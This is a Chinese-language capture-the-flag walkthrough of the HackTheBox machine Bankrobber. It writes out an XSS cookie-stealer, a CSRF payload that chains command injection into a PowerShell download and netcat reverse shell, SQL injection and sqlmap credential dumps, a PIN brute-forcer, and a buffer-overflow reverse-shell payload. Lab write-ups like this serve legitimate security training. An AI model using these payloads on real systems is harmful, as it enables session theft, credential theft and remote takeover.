Bankrobber是一个非常困难的靶机，知识点涉及XSS、SQL注入、CSRF、PHP代码审计、隧道搭建、暴力破解、缓冲区溢出等。感兴趣的同学可以在HackTheBox中进行学习。![截屏2022-01-19
下午3.40.42](https://image.3001.net/images/20220316/1647401289_62315949ab4144baa0cf9.png!small)
_通关思维导图。_  
![Bankrobber](https://image.3001.net/images/20220316/1647401292_6231594cdfa0e64967515.png!small)

## 0x01 侦查

### 端口探测

首先使用 nmap 进行端口扫描：

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.154 -oA nmap_Bankrobber
    

![截屏2022-01-19
下午3.59.33](https://image.3001.net/images/20220316/1647401294_6231594e8c36e026d5272.png!small)扫描结果显示目标开放了80、443、445、3306端口。

####  **445端口**

使用 smbmap 对 smb 服务进行扫描：

    
    
    smbmap -H 10.10.10.154 -u mac
    

![截屏2022-02-08
上午11.21.25](https://image.3001.net/images/20220316/1647401297_62315951aab48847762ae.png!small)结果显示认证失败，无法连接。

####  **3306端口**

对 mysql 数据库进行密码爆破，但是未找到合适的账号密码。  
![截屏2022-02-08
下午3.53.53](https://image.3001.net/images/20220316/1647401298_62315952854a445d8f7e4.png!small)

####  **80/443端口**

访问网站，这是一个比特币钱包站点。  
![截屏2022-02-08
上午11.06.28](https://image.3001.net/images/20220316/1647401314_62315962e3b92c4612c44.png!small)首先注册一个账号，输入账号密码
mac/mac 并点击提交。  
![截屏2022-02-08
下午4.51.30](https://image.3001.net/images/20220316/1647401331_623159735d5d0217df0b7.png!small)通过
mac/mac 登陆进入`/user。`  
![截屏2022-02-08
下午3.08.34](https://image.3001.net/images/20220316/1647401334_623159762072e65c686e2.png!small)在用户界面中提供给他人转账功能。  
![截屏2022-02-08
下午3.03.36](https://image.3001.net/images/20220316/1647401338_6231597ad5f26757c2bd7.png!small)输入金额、ID号以及评论，点击转账后会弹出一条消息：管理员进行审核后会决定交易是否继续。  
![截屏2022-02-08
下午3.12.23](https://image.3001.net/images/20220316/1647401340_6231597c52d57bd5654af.png!small)

之后使用 gobuster 进行目录扫描，发现两个有趣的目录：`/admin`、`/user。`

    
    
    gobuster dir -u http://10.10.10.154 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
    

![截屏2022-02-08
下午2.49.32](https://image.3001.net/images/20220316/1647401341_6231597d843e6f371bcc0.png!small)其中`/user`就是登陆后的用户界面，而`/admin`显示无权限进入，可能是登陆后的管理员界面。  
![截屏2022-02-08
下午2.59.10](https://image.3001.net/images/20220316/1647401343_6231597f9707948995524.png!small)

### Cookie信息

登陆后 Cookie 信息包含`id`、`username`、`password`  
![截屏2022-02-08
下午3.37.56](https://image.3001.net/images/20220316/1647401344_623159809bfe72c2de7d2.png!small)其中`username`和`password`的值由
base64 编码得到，通过以下命令可直接还原。

    
    
    echo "bWFj" | base64 -d
    

![截屏2022-02-08
下午3.44.56](https://image.3001.net/images/20220316/1647401345_62315981c91de8d96ff90.png!small)

## 0x02 上线[cortin]

### XSS获取管理员Cookie

由于转账后管理员会对我们的转账记录进行查看，因此可以在评论中插入 JavaScript 代码来获取去管理员 Cookie 信息，再通过 base64
解码就可以成功登陆管理员账号。首先我们在本地搭建一个 web 环境用于存放js代码。

    
    
    function get_cookie(){
        var img = document.createElement("img");
        img.src = "http://10.10.14.14/xss?=" + document.cookie;
        document.body.appendChild(img);
    }
    get_cookie();
    

同时开启 web 服务。

    
    
    python -m SimpleHTTPServer 80
    

在评论中插入如下 XSS paylaod 进行提交。

    
    
    <script src="http://10.10.14.14/xss.js"></script>
    

![截屏2022-02-08
下午4.17.04](https://image.3001.net/images/20220316/1647401346_62315982aa1873ae41b86.png!small)过几分钟后可以发现两个请求：一是请求js文件，二是返回的
Cookie 信息。  
![截屏2022-02-08
下午5.01.15](https://image.3001.net/images/20220316/1647401348_6231598438c21b25bf354.png!small)通过
base64 解码后成功获取管理员账号密码：admin/Hopelessromantic。

### SQL注入

通过以上账号密码登录管理员，在管理界面中存在交易列表、用户搜索以及后门检查这几个功能模块。  
![截屏2022-02-09
下午3.09.33](https://image.3001.net/images/20220316/1647401349_6231598579e6cb1ca6a6d.png!small)

####  **交易列表**

其中包含交易人、交易金额、评价信息以及管理员审核操作，普通用户发送交易信息给管理员进行审核，点击接收或拒绝可直接处理交易信息。

####  **后门识别**

在后门识别处存在提示信息：可以快速识别位于服务器上的后门，但出于安全只能运行`dir`命令。  
![截屏2022-02-09
下午3.12.32](https://image.3001.net/images/20220316/1647401351_62315987437396b9ca56e.png!small)输入
dir 后显示它只能在 localhost 下运行。  
![截屏2022-02-09
下午3.23.04](https://image.3001.net/images/20220316/1647401353_623159895591ab2e6db59.png!small)

####  **用户搜索**

直接搜索用户ID为1的用户会返回对应的用户信息。  
![截屏2022-02-09
下午3.18.42](https://image.3001.net/images/20220316/1647401354_6231598a7f2bde621b9b3.png!small)搜索用户ID为`1'`则报错，说明可能存在SQL注入漏洞。  
![截屏2022-02-09
下午3.18.58](https://image.3001.net/images/20220316/1647401355_6231598bc89d547d3acec.png!small)使用
order by 判断字段为3。

    
    
    1' order by 3-- -    

![截屏2022-02-09
下午3.34.39](https://image.3001.net/images/20220316/1647401357_6231598d0e7b34338d269.png!small)

可通过联合注入获取信息，如数据库版本、当前用户等。

    
    
    -1' union select 1,2,3-- -    -1' union select version(),user(),3-- -    

![截屏2022-02-09
下午3.35.15](https://image.3001.net/images/20220316/1647401358_6231598e3f47ee6607c28.png!small)![截屏2022-02-09
下午3.36.10](https://image.3001.net/images/20220316/1647401359_6231598f88d9c1886c461.png!small)  
使用 BurpSuite 抓取对应请求数据包并将其保存为`search_sqli.txt`  
![截屏2022-02-09
下午4.09.09](https://image.3001.net/images/20220316/1647401360_62315990b74c47c0e8f18.png!small)使用
sqlmap 进行检测，首先列出数据库。

    
    
    sqlmap -r search_sqli.txt --dbs
    

![截屏2022-02-09
下午4.15.50](https://image.3001.net/images/20220316/1647401361_62315991f399f07091d68.png!small)列出当前数据库所有表。

    
    
    sqlmap -r search_sqli.txt -D bankrobber --tables
    

![截屏2022-02-09
下午4.30.44](https://image.3001.net/images/20220316/1647401364_6231599454ff30cfbe003.png!small)列出当前数据库
users 表中所有数据。

    
    
    sqlmap -r search_sqli.txt -D bankrobber -T users --dump
    

![截屏2022-02-09
下午4.31.39](https://image.3001.net/images/20220316/1647401366_6231599657fe1b1ec3368.png!small)查询数据库用户密码。

    
    
    sqlmap -r search_sqli.txt --passwords
    

![截屏2022-02-09
下午4.45.09](https://image.3001.net/images/20220316/1647401368_623159984b47560d37a7b.png!small)成功获取
root 用户哈希值：F435725A173757E57BD36B09048B8B610FF4D0C4，通过网站破解md5值  
 **破解网站：https://crackstation.net/**  
![截屏2022-02-09
下午4.59.10](https://image.3001.net/images/20220316/1647401370_6231599a9f3b68a1aac98.png!small)
成功破解密码为`Welkom1!`

### PHP代码审计

访问地址`http://10.10.10.154/notes.txt`发现这是 xampp，默认绝对路径为`C:/xampp/htdocs`  
![截屏2022-02-09
下午5.29.36](https://image.3001.net/images/20220316/1647401371_6231599bb67690c7f673e.png!small)有了绝对路径后我们可直接读取后门识别脚本
backdoorchecker.php

    
    
    sqlmap -r search_sqli.txt --file-read '/xampp/htdocs/admin/backdoorchecker.php'
    

源码如下所示：

    
    
    <?php
    include('../link.php');
    include('auth.php');
    
    $username = base64_decode(urldecode($_COOKIE['username']));
    $password = base64_decode(urldecode($_COOKIE['password']));
    $bad      = array('$(','&');
    $good     = "ls";
    
    if(strtolower(substr(PHP_OS,0,3)) == "win"){
            $good = "dir";
    }
    
    if($username == "admin" && $password == "Hopelessromantic"){
            if(isset($_POST['cmd'])){
                            // FILTER ESCAPE CHARS
                            foreach($bad as $char){
                                    if(strpos($_POST['cmd'],$char) !== false){
                                            die("You're not allowed to do that.");
                                    }
                            }
                            // CHECK IF THE FIRST 2 CHARS ARE LS
                            if(substr($_POST['cmd'], 0,strlen($good)) != $good){
                                    die("It's only allowed to use the $good command");
                            }
    
                            if($_SERVER['REMOTE_ADDR'] == "::1"){
                                    system($_POST['cmd']);
                            } else{
                                    echo "It's only allowed to access this function from localhost (::1).<br>
     This is due to the recent hack attempts on our server.";
                            }
            }
    } else{
            echo "You are not allowed to use this function!";
    }
    ?>
    

首先用户的 Cookie
值需要为管理员用户，其中黑名单关键词为`$(`、`&`，如果存在其中一个关键词，系统提示无法执行，同时它会检查命令前三个字符是否为`dir`，通过后检查远程地址是否为`localhost`，如果是的话传递给命令行进行执行。那么我们需要考虑的问题是如何从本地发送我们的请求，至于执行命令可以通过`&`或`|`符号将其他命令链接到`dir`

### XSS+CSRF

首先考虑从之前的 XSS 漏洞入手，在第一次通过 XSS 获取 Cookie
我们发现对方管理员的请求IP为10.10.10.154，即是服务器地址。因此我们可以提交请求，让对方管理员帮助我们执行 JavaScript 代码，从而实现
CSRF。  
首先创建一个 JavaScript 代码用于执行 payload：

    
    
    var request = new XMLHttpRequest();
    var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.16/nc64.exe -outfile %temp%\\nc.exe";%temp%\\nc.exe -e cmd.exe 10.10.14.16 4444';
    request.open('POST','http://localhost/admin/backdoorchecker.php',true);
    request.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    request.send(params);
    

同时提交 XSS payload：

    
    
    <script src="http://10.10.14.16/shell.js"></script>
    

![截屏2022-02-10
下午3.32.03](https://image.3001.net/images/20220316/1647401372_6231599cabbaed66509dc.png!small)

将`nc64.exe`复制到当前目录并开启 web 服务。

    
    
    python -m SimpleHTTPServer 80
    

在本地监听4444端口。

    
    
    rlwrap nc -nvlp 4444
    

![截屏2022-02-10
下午3.39.20](https://image.3001.net/images/20220316/1647401374_6231599e0577e1df309e1.png!small)  
成功拿到反弹shell，在当前用户桌面上寻找第一个flag。

    
    
    dir c:\Users\Cortin\Desktop
    type c:\Users\Cortin\Desktop\user.txt
    

![截屏2022-02-10
下午3.42.05](https://image.3001.net/images/20220316/1647401375_6231599f4b59ab54ee205.png!small)  
成功获取到第一个flag。

## 0x03 权限提升[system]

### 信息收集

在C盘根目录下发现二进制文件`backv2.exe`

    
    
    dir c:\
    

![截屏2022-02-10
下午3.59.43](https://image.3001.net/images/20220316/1647401376_623159a091d1ceb282de9.png!small)  
但是使用 icacls 和 cacls 进行查看发现无法访问。

    
    
    icacls c:\bankv2.exe
    cacls c:\bankv2.exe
    

![截屏2022-02-10
下午4.02.08](https://image.3001.net/images/20220316/1647401378_623159a2528e965288d65.png!small)  
在本地查看开放端口：

    
    
    netstat -ano
    

![截屏2022-02-10
下午4.04.12](https://image.3001.net/images/20220316/1647401379_623159a384245e54b72f5.png!small)  
在其中发现 nmap 未扫描到的端口：910，于是在本地查看910端口对应的进程，发现它正运行着`bankv2.exe`

    
    
    tasklist | findstr 1640
    

![截屏2022-02-10
下午4.08.10](https://image.3001.net/images/20220316/1647401381_623159a54faad04e65f7b.png!small)  
进一步查看进程`bankv2.exe`可以发现运行权限为系统权限，因此我们可以尝试通过`bankv2.exe`进行提权。

    
    
    tasklist /V
    

![截屏2022-02-10
下午5.46.01](https://image.3001.net/images/20220316/1647401382_623159a660409bd46403f.png!small)使用上传的
nc.exe 尝试连接910端口。

    
    
    %temp%\nc.exe 127.0.0.1 910
    

![截屏2022-02-10
下午4.16.28](https://image.3001.net/images/20220316/1647401384_623159a81504ea8f230b5.png!small)输入密码1234但是无法连接，由于
PIN 码只包含4个数字我们可以尝试暴力破解。

### 搭建隧道

我们可以使用 Chisel 来建立隧道进行暴力破解，首先在靶机中下载 chisel.exe  
 **下载地址：https://github.com/jpillora/chisel**

    
    
    cd C:\Users\Cortin\AppData\Local\Temp
    powershell -c "wget http://10.10.14.16/chisel.exe -o chisel.exe"
    

与此同时在本地启动服务，监听8000端口并允许反向隧道。

    
    
    ./chisel server -p 8000 --reverse
    

![截屏2022-02-10
下午4.40.38](https://image.3001.net/images/20220316/1647401385_623159a9a7ecd92d13764.png!small)  
将靶机中的910端口转发到本地910端口上。

    
    
    chisel.exe client 10.10.14.16:8000 R:910:localhost:910
    

![截屏2022-02-10
下午4.51.02](https://image.3001.net/images/20220316/1647401386_623159aade525b1d72f68.png!small)

完成后测试隧道是否已经建立。

    
    
    nc localhost 910
    

![截屏2022-02-10
下午4.53.46](https://image.3001.net/images/20220316/1647401387_623159abe829da514cd9e.png!small)

### 暴力破解

尝试编写 python 脚本用于暴力破解 PIN 码，首先建立 socket 连接本地910端口，发送 PIN
码和换行符并在响应中检查是否包含`Access denied`，如果不存在说明成功找到 PIN 码。

    
    
    import socket 
    import sys
    
    for i in range(10000):
        sys.stdout.write(f"\rTring: {i:04d}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost',910))
        s.recv(4096)
        s.send(f"{i:04d}\n".encode())
        resp = s.recv(4096)
        if not b"Access denied" in resp:
            print(f"\rFound pin: {i:04d}")
            break
        s.close()
    

![截屏2022-02-10
下午4.55.20](https://image.3001.net/images/20220316/1647401388_623159ace199b60dea941.png!small)  
运行发现 PIN 码为0021。

### 缓冲区溢出

这貌似是一个比特币转账程序，输入任意字符显示正在执行。

    
    
    nc localhost 910
    

![截屏2022-02-10
下午4.58.12](https://image.3001.net/images/20220316/1647401389_623159ade33bdfa7255de.png!small)  
尝试输入一串 A 字符，结果显示它覆盖了正在执行的文件名称。

    
    
    nc localhost 910
    

![截屏2022-02-10
下午5.01.14](https://image.3001.net/images/20220316/1647401391_623159af80173607de6b6.png!small)  
使用 msf-pattern_create 生成40位随机数值并作为金额进行提交。

    
    
    msf-pattern_create -l 40
    

![截屏2022-02-10
下午5.23.47](https://image.3001.net/images/20220316/1647401393_623159b1356485719f12f.png!small)  
成功拿到偏移量为32。

    
    
    msf-pattern_offset -q 0Ab1
    

![截屏2022-02-10
下午5.24.31](https://image.3001.net/images/20220316/1647401394_623159b2af93b1bda6c8a.png!small)  
使用 python 输出偏移字符+用于反弹shell的payload。

    
    
    python -c 'print "A"*32 + "\\Users\\Cortin\\AppData\\Local\\Temp\\nc.exe -e cmd.exe 10.10.14.16 4433"'
    

![截屏2022-02-10
下午5.30.45](https://image.3001.net/images/20220316/1647401395_623159b37ef53e08452ad.png!small)  
在本地监听4433端口。

    
    
    rlwrap nc -nvlp 4433
    

运行程序输入 payload。  
![截屏2022-02-10
下午5.28.26](https://image.3001.net/images/20220316/1647401396_623159b485944ec5f40c3.png!small)  
成功拿到系统权限。  
![截屏2022-02-10
下午5.28.35](https://image.3001.net/images/20220316/1647401398_623159b688af144322901.png!small)在管理员用户
admin 桌面寻找第二个flag。

    
    
    dir c:\Users\admin\Desktop
    type c:\Users\admin\Desktop\root.txt
    

![截屏2022-02-10
下午5.29.54](https://image.3001.net/images/20220316/1647401400_623159b80a0879723caf2.png!small)  
成功拿到第二个flag。

**总结：在站点中注册账户，登陆后查看http请求包发现Cookie编码方式为base64，同时在转账的评论处发现XSS漏洞，提交带有XSS的转账信息在管理员访问后可获取其Cookie信息，对Cookie进行解码后拿到明文。**

**登陆管理界面，发现其中存在SQL注入漏洞，通过SQL注入拿到站点用户密码以及数据库管理员root密码。XSS和CSRF联动使管理员执行反弹shell命令，从而获取到目标用户权限。在靶机中发现异常端口910，其对应程序为bankv2.exe，连接该端口提示我们需要输入PIN码（4位数字），由于靶机上没有python环境，无法执行爆破脚本。**

 **因此可建立隧道帮助我们爆破PIN码并成功进入。经过测试后发现该程序存在缓冲区溢出漏洞，利用该漏洞执行反弹shell可成功获取系统权限。**

